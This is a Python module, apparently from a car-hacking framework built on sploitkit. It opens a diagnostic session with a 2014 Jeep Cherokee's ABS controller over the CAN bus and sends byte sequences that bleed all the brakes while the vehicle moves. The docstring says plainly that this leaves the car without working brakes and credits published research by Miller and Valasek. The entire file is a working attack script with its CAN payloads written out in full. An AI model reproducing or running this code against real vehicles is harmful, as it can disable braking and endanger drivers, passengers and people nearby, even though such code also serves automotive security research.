from sploitkit import *
import can

class cherokee_kill_brakes(Module):
    """ This module will bleed all the brakes on the 2014 Jeep Cherokee while the car is moving.
    This has the result that the brakes will not work during this time and has significant
    safety issues, even if it only works if you are driving slowly.  

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: http://www.illmatics.com/Remote%20Car%20Hacking.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        print("[+] Starting a diagnostic session with the ABS ECU...")
        msg = can.Message(arbitration_id=0x18DA28F1, data=[0x02,0x10,0x03,0,0,0,0,0], is_extended_id=True)
        try:
            bus.send(msg)
            print("[*] Bleeding all the brakes at maximum")
            msg2 = can.Message(arbitration_id=0x18DA28F1, data=[0x10,0x11,0x2F,0x5A,0xBF,0x03,0x64,0x64], is_extended_id=True)
            msg3 = can.Message(arbitration_id=0x18DA28F1, data=[0x64,0x64,0x64,0x64,0x64,0x64,0x64,0x64], is_extended_id=True)
            msg4 = can.Message(arbitration_id=0x18DA28F1, data=[0x64,0x64,0x64,0,0,0,0,0], is_extended_id=True)
            bus.send(msg2)
            bus.send(msg3)
            bus.send(msg4)
        except:
            print("Message not sent thus stopping the attack")
